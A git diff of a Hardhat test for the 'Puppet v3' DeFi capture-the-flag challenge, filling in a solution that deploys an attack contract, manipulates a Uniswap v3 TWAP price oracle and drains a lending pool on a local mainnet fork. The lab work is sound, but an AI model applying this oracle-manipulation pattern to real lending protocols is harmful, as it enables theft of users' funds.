@@ -1,6 +1,6 @@
-const { ethers } = require('hardhat');
+const { ethers } = require('hardhat'); 
 const { expect } = require('chai');
-const { time, setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { time, setBalance } = require("@nomicfoundation/hardhat-network-helpers")
 
 const positionManagerJson = require("@uniswap/v3-periphery/artifacts/contracts/NonfungiblePositionManager.sol/NonfungiblePositionManager.json");
 const factoryJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Factory.sol/UniswapV3Factory.json");
@@ -24,9 +24,10 @@ describe('[Challenge] Puppet v3', function () {
     let deployer, player;
     let uniswapFactory, weth, token, uniswapPositionManager, uniswapPool, lendingPool;
     let initialBlockTimestamp;
+    let attack;
 
     /** SET RPC URL HERE */
-    const MAINNET_FORKING_URL = "";
+    const MAINNET_FORKING_URL = "http://127.0.0.1:8545/";
 
     // Initial liquidity amounts for Uniswap v3 pool
     const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
@@ -40,6 +41,11 @@ describe('[Challenge] Puppet v3', function () {
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+        // Setting up localhost using quiknode.com
+        // 1. yarn hardhat node --fork https://few-clean-vineyard.discover.quiknode.pro/.../ --fork-block-number 15450164
+        // 2. new terminal -> yarn hardhat console --network localhost
+        // 15450164_10 == ebc034_16
+        // 3. await network.provider.send("eth_blockNumber")
 
         // Fork from mainnet state
         await ethers.provider.send("hardhat_reset", [{
@@ -47,13 +53,13 @@ describe('[Challenge] Puppet v3', function () {
         }]);
 
         // Initialize player account
-        // using private key of account #2 in Hardhat's node
+        // using private key of account #1 in Hardhat's node
         player = new ethers.Wallet("0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d", ethers.provider);
         await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
         expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE);
 
         // Initialize deployer account
-        // using private key of account #1 in Hardhat's node
+        // using private key of account #0 in Hardhat's node
         deployer = new ethers.Wallet("0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80", ethers.provider);
         await setBalance(deployer.address, DEPLOYER_INITIAL_ETH_BALANCE);
         expect(await ethers.provider.getBalance(deployer.address)).to.eq(DEPLOYER_INITIAL_ETH_BALANCE);
@@ -139,7 +145,30 @@ describe('[Challenge] Puppet v3', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        const AttackFactory = await ethers.getContractFactory('AttackPv3', player);
+        attack = await AttackFactory.deploy(player.address,token.address,weth.address,lendingPool.address);
+        let time1 = (await ethers.provider.getBlock('latest')).timestamp;
+        console.log("time 1 = ", time1);
+
+        console.log("initial requirement = ", (await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)).div(10n**18n));
+
+        await token.connect(player).transfer(attack.address, token.balanceOf(player.address));
+        await attack.connect(player).kek();
+        
+        while (await attack.connect(player).kekBigger(LENDING_POOL_INITIAL_TOKEN_BALANCE)) {
+            //console.log("waiting");
+            await time.increase(1);
+            //console.log("new requirement = ", (await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)).div(10n**18n));
+        }
+
+        console.log("requirement after waitng = ", (await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)).div(10n**18n));
+
+        await weth.connect(player).approve(lendingPool.address, ethers.constants.MaxUint256);
+        await lendingPool.connect(player).borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        let time2 = (await ethers.provider.getBlock('latest')).timestamp;
+        console.log("time 2 = ", time2);
+        console.log("time passed = ", time2-time1);
+
     });
 
     after(async function () {
